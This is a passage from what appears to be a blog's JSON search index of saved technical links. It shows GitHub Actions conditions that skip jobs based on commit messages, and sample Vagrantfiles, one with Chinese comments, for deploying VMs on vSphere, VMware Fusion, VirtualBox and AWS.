style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Nginx","ESXi"],"title":"Nginx HTTPS with Basic Auth reverse proxy for VMware ESXi 6.5 fixed VMRC /screen"},{"categories":["URL","Github"],"contents":" Running GitHub Actions for Certain Commit Messages Now, whenever I push a wip commit or any commit that contains the word wip, it will be marked as skipped inside of GitHub actions.\njobs: format: runs-on: ubuntu-latest if: \u0026#34;! contains(github.event.head_commit.message, \u0026#39;wip\u0026#39;)\u0026#34; Any commit that contains [build] will now trigger these jobs, everything else will be skipped.\njobs: format: runs-on: ubuntu-latest if: \u0026#34;contains(github.event.head_commit.message, \u0026#39;[build]\u0026#39;)\u0026#34; ","date":"October 11, 2020","hero":"/images/hero/github.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201011-running-github-actions-for-certain-commit-messages/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ryangjchandler.co.uk/articles/running-github-actions-for-certain-commit-messages\" target=\"_blank\" rel=\"noopener\"\u003eRunning GitHub Actions for Certain Commit Messages\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eNow, whenever I push a \u003ccode\u003ewip\u003c/code\u003e commit or any commit that contains the word \u003ccode\u003ewip\u003c/code\u003e, it will be marked as skipped inside of GitHub actions.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003ejobs\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eformat\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eruns-on\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eubuntu-latest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eif\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;! contains(github.event.head_commit.message, \u0026#39;wip\u0026#39;)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAny commit that contains \u003ccode\u003e[build]\u003c/code\u003e will now trigger these jobs, everything else will be skipped.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003ejobs\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eformat\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eruns-on\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eubuntu-latest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eif\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;contains(github.event.head_commit.message, \u0026#39;[build]\u0026#39;)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Github"],"title":"Running GitHub Actions for Certain Commit Messages"},{"categories":["URL","vagrant"],"contents":" Using Vagrant to Deploy Multiple VMs on vSphere vm1 = { \u0026#39;name\u0026#39; =\u0026gt; \u0026#34;PhotonVM1\u0026#34;, \u0026#39;ip\u0026#39; =\u0026gt; \u0026#34;192.168.5.224\u0026#34; } vm2 = { \u0026#39;name\u0026#39; =\u0026gt; \u0026#34;PhotonVM2\u0026#34;, \u0026#39;ip\u0026#39; =\u0026gt; \u0026#34;192.168.5.225\u0026#34; } vms = [ vm1, vm2] Vagrant.configure(2) do |config| vms.each do |node| vm_name = node[\u0026#39;name\u0026#39;] vm_ip = node[\u0026#39;ip\u0026#39;] config.vm.define vm_name do |node_config| node_config.vm.network \u0026#39;private_network\u0026#39;, ip: \u0026#34;#{vm_ip}\u0026#34; node_config.vm.box = \u0026#34;dummy\u0026#34; node_config.vm.box_url = \u0026#34;./example_box/dummy.box\u0026#34; node_config.vm.provider :vsphere do |vsphere| vsphere.host = \u0026#39;vc01.testlab.local\u0026#39; vsphere.compute_resource_name = \u0026#39;esxi01.testlab.local\u0026#39; vsphere.name = vm_name vsphere.customization_spec_name = \u0026#39;centos66\u0026#39; vsphere.template_name = \u0026#39;PhotonTemplate\u0026#39; vsphere.user = \u0026#39;administrator@vsphere.local\u0026#39; vsphere.password = \u0026#39;password\u0026#39; vsphere.insecure = true end end end end ","date":"October 5, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201005-using-vagrant-to-deploy-multiple-vms-on-vsphere/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://buildvirtual.net/using-vagrant-to-deploy-multiple-vms-on-vsphere/\" target=\"_blank\" rel=\"noopener\"\u003eUsing Vagrant to Deploy Multiple VMs on vSphere\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ruby\" data-lang=\"ruby\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evm1 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e { \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;PhotonVM1\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ip\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.5.224\u0026#34;\u003c/span\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evm2 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e { \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;PhotonVM2\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ip\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.5.225\u0026#34;\u003c/span\u003e }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evms \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e vm1, vm2\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eVagrant\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003econfigure(\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003econfig\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  vms\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eeach \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003enode\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vm_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e node\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    vm_ip \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e node\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ip\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edefine vm_name \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003enode_config\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        node_config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003enetwork \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;private_network\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003eip\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e#{\u003c/span\u003evm_ip\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        node_config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;dummy\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        node_config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox_url \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;./example_box/dummy.box\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        node_config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e:vsphere\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003evsphere\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehost \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;vc01.testlab.local\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ecompute_resource_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;esxi01.testlab.local\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ename \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e vm_name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ecustomization_spec_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;centos66\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etemplate_name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;PhotonTemplate\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003euser \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;administrator@vsphere.local\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epassword \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;password\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        vsphere\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003einsecure \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","vagrant"],"title":"Using Vagrant to Deploy Multiple VMs on vSphere"},{"categories":["URL","vagrant"],"contents":" Day 8 - Vagrantfile and Provider Day 9 - Advanced Vagrantfile(編輯中) 用以下這個範例 你只要使用 Vagrant up 加上 provider 參數，就可開啟不同來源的機器\n例如我要開啟 Vsphere 的機器，我只要下 vagrant up --provider=vsphere\n要開 AWS 的機器，我只要下 vagrant up --provider=aws\nVAGRANTFILE_API_VERSION = \u0026#34;2\u0026#34; Vagrant.configure(VAGRANTFILE_API_VERSION) do |config| # 我們定義一個 Ubuntu 的機器 # box 的需求是對於 local 的 VM 才需要的 # 所以在 provider 是 vmware_fusion 或 Virtualbox 時，才會用到這個設定 config.vm.box = \u0026#34;hashicorp/precise64\u0026#34; # vmware_fusion config.vm.provider \u0026#34;vmware_fusion\u0026#34; do |v, override| override.vm.box = \u0026#34;precise64_vmware\u0026#34; v.gui = false end # vsphere config.vm.provider :vsphere do |vsphere| # 對於私有雲及公有雲，要clone 的vm 是儲存在雲端上的 # 所以 box 使用 dummy box 來達到這個目的 vsphere.vm.box = \u0026#34;nkhasanov/vsphere-simple\u0026#34; vsphere.host = \u0026#39;YOURIP\u0026#39; vsphere.compute_resource_name = \u0026#39;YOUR DATACENTER\u0026#39; vsphere.resource_pool_name = \u0026#39;YOUR RESOURCE POOL\u0026#39; vsphere.insecure = true vsphere.template_name = \u0026#39;VM TEMPLATE\u0026#39; vsphere.name = \u0026#34;#{YOUR_NAME}-test-machine\u0026#34; vsphere.user = \u0026#39;administrator\u0026#39; vsphere.password = \u0026#39;$p1unK_Lab\u0026#39; vsphere.vm_base_path = \u0026#39;vmware_template\u0026#39; vsphere.linked_clone = true end # virtual box config.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.gui = false end # aws config.vm.provider :aws do |aws, override| # aws configurations aws.access_key_id = \u0026#34;#{YOUR_AWS_ACCESS_KEY_ID}\u0026#34; aws.secret_access_key = \u0026#34;#{YOUR_AWS_ACCESS_KEY}\u0026#34; aws.keypair_name = \u0026#34;#{YOUR_NAME}\u0026#34; aws.security_groups = \u0026#34;#{YOUR_NAME}\u0026#34; aws.instance_type = \u0026#34;t2.small\u0026#34; aws.region = \u0026#34;us-east-1\u0026#34; # ubuntu 14.04 x64 aws.ami = \u0026#34;ami-864d84ee\u0026#34; # override info override.ssh.username = \u0026#34;ubuntu\u0026#34; override.ssh.private_key_path = \u0026#34;#{YOUR_AWS_PRIVATE_KEY_PATH}\u0026#34; override.vm.synced_folder \u0026#34;#{YOUR_SYNC_FOLDER}\u0026#34;, \u0026#34;/vagrant\u0026#34;, type: \u0026#34;rsync\u0026#34; override.vm.box = \u0026#34;dimroc/awsdummy\u0026#34; end end LOCAL_BOXS = { \u0026#34;ubuntu1404x64\u0026#34; =\u0026gt; \u0026#34;ubuntu/trusty64\u0026#34;, \u0026#34;ubuntu1210x64\u0026#34; =\u0026gt; \u0026#34;chef/ubuntu-12.10\u0026#34; } AWS_AMIS = { \u0026#34;ubuntu1404x64\u0026#34; =\u0026gt; \u0026#34;ami-864d84ee\u0026#34;, \u0026#34;ubuntu1210x64\u0026#34; =\u0026gt; \u0026#34;ami-02df496b\u0026#34;, \u0026#34;windows2012r2x64\u0026#34; =\u0026gt; \u0026#34;ami-9ade1df2\u0026#34;, \u0026#34;windows2012x64\u0026#34; =\u0026gt; \u0026#34;ami-5ce32034\u0026#34;, \u0026#34;windows2008r2x64\u0026#34; =\u0026gt; \u0026#34;ami-2ae02342\u0026#34;, \u0026#34;windows2008x64\u0026#34; =\u0026gt; \u0026#34;ami-5e24e936\u0026#34;, \u0026#34;windows2003r2x64\u0026#34; =\u0026gt; \u0026#34;ami-b0e320d8\u0026#34; } VAGRANTFILE_API_VERSION = \u0026#34;2\u0026#34; Vagrant.configure(VAGRANTFILE_API_VERSION) do |config| config.vm.box = \u0026#34;precise64_vmware\u0026#34; # vmware_fusion config.vm.provider \u0026#34;vmware_fusion\u0026#34; do |v, override| override.vm.box = \u0026#34;precise64_vmware\u0026#34; v.gui = false v.vmx[\u0026#34;memsize\u0026#34;] = \u0026#34;1024\u0026#34; v.vmx[\u0026#34;numvcpus\u0026#34;] = \u0026#34;2\u0026#34; end # vsphere config.vm.provider :vsphere do |vsphere| vsphere.vm.box = \u0026#34;nkhasanov/vsphere-simple\u0026#34; vsphere.host = \u0026#39;#{}\u0026#39; vsphere.compute_resource_name = \u0026#39;#{}\u0026#39; # vsphere.resource_pool_name = \u0026#39;YOUR RESOURCE POOL\u0026#39; vsphere.insecure = true vsphere.template_name = \u0026#39;qasus-tw-centos7x64-01\u0026#39; vsphere.name = \u0026#34;#{YOUR_NAME}-test-machine\u0026#34; vsphere.user = \u0026#39;administrator\u0026#39; vsphere.password = \u0026#39;#{}\u0026#39; vsphere.vm_base_path = \u0026#39;vmware_template\u0026#39; vsphere.linked_clone = true end # virtual box config.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.gui = false vb.memory = 1024 vb.cpus = 2 end # aws config.vm.provider :aws do |aws, override| # aws configurations aws.access_key_id = \u0026#34;#{YOUR_AWS_ACCESS_KEY_ID}\u0026#34; aws.secret_access_key = \u0026#34;#{YOUR_AWS_ACCESS_KEY}\u0026#34; aws.keypair_name = \u0026#34;#{YOUR_NAME}\u0026#34; aws.security_groups = \u0026#34;#{YOUR_NAME}\u0026#34; aws.instance_type = \u0026#34;t2.small\u0026#34; aws.region = \u0026#34;us-east-1\u0026#34; # ubuntu 14.04 x64 aws.ami = \u0026#34;ami-864d84ee\u0026#34; # override info override.ssh.username = \u0026#34;ubuntu\u0026#34; override.ssh.private_key_path = \u0026#34;#{YOUR_AWS_PRIVATE_KEY_PATH}\u0026#34; override.vm.synced_folder \u0026#34;#{YOUR_SYNC_FOLDER}\u0026#34;, \u0026#34;/vagrant\u0026#34;, type: \u0026#34;rsync\u0026#34; override.vm.box = \u0026#34;dimroc/awsdummy\u0026#34; end # VMs (1..MAX_VM_NUMBER).each do |i| # define linux config.vm.define \u0026#34;l#{i}\u0026#34; do |node| # aws node.vm.provider :aws do |aws| aws.tags = { \u0026#34;Name\u0026#34; =\u0026gt; \u0026#34;#{YOUR_NAME}-linux-#{i}\u0026#34; } end # local # node.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.33.%d\u0026#34; % (i+2) node.vm.hostname = \u0026#34;ftan-linux-#{i}\u0026#34; end # define windows config.vm.define \u0026#34;w#{i}\u0026#34; do |node| node.vm.provider :aws do |aws| aws.ami = \u0026#34;ami-2ae02342\u0026#34; aws.tags = { \u0026#34;Name\u0026#34; =\u0026gt; \u0026#34;#{YOUR_NAME}-windows-#{i}\u0026#34; } end end end # define customer YOUR_CUSTOMIZED_VM.each do |vm| config.vm.define \u0026#34;%s\u0026#34; % vm[\u0026#34;name\u0026#34;] do |node| # aws node.vm.provider :aws do |aws| aws.ami = AWS_AMIS[vm[\u0026#34;platform\u0026#34;]] aws.tags = { \u0026#34;Name\u0026#34; =\u0026gt; \u0026#34;#{YOUR_NAME}-%s\u0026#34; % vm[\u0026#34;name\u0026#34;] } end # vmware fusion # vmware workstation node.vm.provider :vmware_fusion do |fusion| fusion.vm.box = LOCAL_BOXS[vm[\u0026#34;platform\u0026#34;]] fusion.vm.hostname = \u0026#34;#{YOUR_NAME}-%s\u0026#34; % vm[\u0026#34;name\u0026#34;] end # vsphere # azure end end end ","date":"October 2, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20201002-10158898/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10158898\" target=\"_blank\" rel=\"noopener\"\u003eDay 8 - Vagrantfile and Provider\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://ithelp.ithome.com.tw/articles/10159037\" target=\"_blank\" rel=\"noopener\"\u003eDay 9 - Advanced Vagrantfile(編輯中)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e用以下這個範例\n你只要使用 Vagrant up 加上 provider 參數，就可開啟不同來源的機器\u003c/p\u003e\n\u003cp\u003e例如我要開啟 Vsphere 的機器，我只要下 \u003ccode\u003evagrant up --provider=vsphere\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e要開 AWS 的機器，我只要下 \u003ccode\u003evagrant up --provider=aws\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ruby\" data-lang=\"ruby\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eVAGRANTFILE_API_VERSION\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eVagrant\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003econfigure(\u003cspan style=\"color:#66d9ef\"\u003eVAGRANTFILE_API_VERSION\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003econfig\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# 我們定義一個 Ubuntu 的機器\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# box 的需求是對於 local 的 VM 才需要的\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# 所以在 provider 是 vmware_fusion 或 Virtualbox 時，才會用到這個設定\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hashicorp/precise64\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# vmware_fusion\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;vmware_fusion\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003ev, override\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      override\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebox \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;precise64_vmware\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      v\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egui \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eend\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e# vsphere\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  config\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evm\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprovider \u003cspan style=\"color:#e6db74\"\u003e:vsphere\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003evsphere\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 對於私有雲及公有雲，要clone 的vm 是儲存在雲端上的\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# 所以 box 使用 dummy box 